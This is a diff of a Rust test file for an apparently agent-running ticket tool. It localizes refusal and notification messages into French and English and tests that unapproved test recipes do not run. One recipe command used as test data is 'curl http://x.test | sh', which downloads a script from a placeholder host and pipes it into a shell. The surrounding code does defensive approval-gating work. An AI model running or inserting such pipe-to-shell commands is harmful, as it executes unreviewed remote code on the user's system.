@@ -4169,7 +4169,10 @@ async fn a_recipe_the_user_did_not_approve_runs_no_step_until_it_is_and_a_new_on
             .unwrap_err()
             .to_string()
     };
-    assert_eq!(refused(&h), crate::testlaunch::NOT_APPROVED);
+    assert_eq!(
+        refused(&h),
+        crate::testlaunch::not_approved(crate::i18n::Lang::Fr)
+    );
     assert!(h.agent(&a.id).approved_recipe.is_none());
 
     // Read and approved: it runs, and the approval is kept with the agent.
@@ -4211,7 +4214,10 @@ async fn a_recipe_the_user_did_not_approve_runs_no_step_until_it_is_and_a_new_on
         h.agent(&a.id).recipe.unwrap().processes[0].command,
         "curl http://x.test | sh"
     );
-    assert_eq!(refused(&h), crate::testlaunch::NOT_APPROVED);
+    assert_eq!(
+        refused(&h),
+        crate::testlaunch::not_approved(crate::i18n::Lang::Fr)
+    );
     approve_current(&h, &a.id);
     assert_eq!(
         h.core.test_run_spec(&a.id, "run", 0).unwrap().command,
@@ -4246,7 +4252,7 @@ async fn an_approval_only_covers_the_recipe_the_user_was_shown() {
     };
     h.core.agent(&a.id).unwrap().lock().meta.recipe = Some(current.clone());
     let e = h.core.approve_recipe(&a.id, shown).unwrap_err().to_string();
-    assert_eq!(e, crate::tickets::RECIPE_CHANGED);
+    assert_eq!(e, crate::tickets::Refusal::RecipeChanged.to_string());
     assert!(h.agent(&a.id).approved_recipe.is_none());
     // The window is told of the approval, to show the test going on.
     h.core.approve_recipe(&a.id, current.clone()).unwrap();
@@ -4824,6 +4830,49 @@ async fn the_statistics_add_up_the_agents_of_a_ticket_archived_ones_included() {
         ),
         ("DEM-1", "Ajouter le login", 2, 1.5)
     );
+}
+
+#[test]
+fn says_in_english_why_a_ticket_is_refused_or_blocked_and_what_its_notification_says() {
+    use crate::i18n::Lang::{En, Fr};
+    use crate::tickets::{conflict_reason, quota_lost, ticket_alert, Refusal};
+    assert_eq!(
+        Refusal::RecipeChanged.text(En),
+        "The recipe changed while you were reading it: run “▶ Test” again to read it."
+    );
+    assert_eq!(
+        Refusal::AgentBusy.text(En),
+        "This ticket’s agent is still working: wait for the end of its turn to approve it."
+    );
+    assert_eq!(
+        Refusal::NotInReview.text(En),
+        "This ticket isn’t in “To review”."
+    );
+    // As the window gets it: in the interface's language, French in the tests.
+    assert_eq!(
+        Refusal::Changed.to_string(),
+        "Ce ticket a changé pendant sa validation."
+    );
+    assert_eq!(
+        [
+            ticket_alert(En, "DEM-1", true, ""),
+            ticket_alert(En, "DEM-1", false, "Interrupted"),
+            ticket_alert(Fr, "DEM-1", false, "Interrompu"),
+        ],
+        [
+            "DEM-1 ready to review",
+            "DEM-1 blocked: Interrupted",
+            "DEM-1 bloqué : Interrompu"
+        ]
+    );
+    assert_eq!(
+        [
+            conflict_reason(En, "main", &[], true),
+            conflict_reason(En, "main", &["a.ts".into(), "b.ts".into()], false),
+        ],
+        ["Conflict with main", "Conflict with main on: a.ts, b.ts"]
+    );
+    assert_eq!(quota_lost(En), "usage limit reached");
 }
 
 /// A harness lives in a folder named after it, which `test_dir` wipes when a test asks for it: two tests that
